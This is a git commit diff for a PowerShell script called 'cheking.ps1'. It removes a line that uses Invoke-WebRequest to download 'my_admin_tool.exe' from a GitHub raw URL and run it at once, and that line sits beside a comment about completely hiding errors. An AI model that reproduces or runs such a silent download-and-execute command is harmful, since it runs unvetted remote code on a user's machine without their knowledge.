1d8139c727160d12e693eef629ef35155f41c2fc
Proshkaversus <fima17167@gmail.com>
2026-01-10 17:57:45 +0200

    Update cheking.ps1

--- cheking.ps1
+++ cheking.ps1
@@ -95,5 +95,6 @@ try {
     # Полностью скрываем ошибки
 }
 
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
+
+
 
